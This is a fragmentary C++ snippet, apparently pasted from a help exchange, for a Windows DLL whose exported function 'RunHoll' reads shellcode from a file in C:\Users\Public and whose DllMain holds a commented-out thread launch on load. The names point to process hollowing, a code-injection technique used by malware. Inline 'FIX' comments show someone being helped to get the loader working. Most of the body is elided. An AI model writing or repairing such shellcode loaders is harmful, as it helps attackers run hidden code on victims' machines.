...
extern "C" __declspec(dllexport) int RunHoll() {

	const char* fileName = "C:\\Users\\Public\\s.bin"; // Changed to const char*
	...
	if (!ReadShellcodeFile((CHAR*)fileName, &shellCode, &shellcodesize)) {
...
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
	...
	case DLL_PROCESS_ATTACH:
		// FIX: Changed "RunHollowing" to "RunHoll" to match your export
		// CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunHoll, NULL, 0, NULL);
		break;
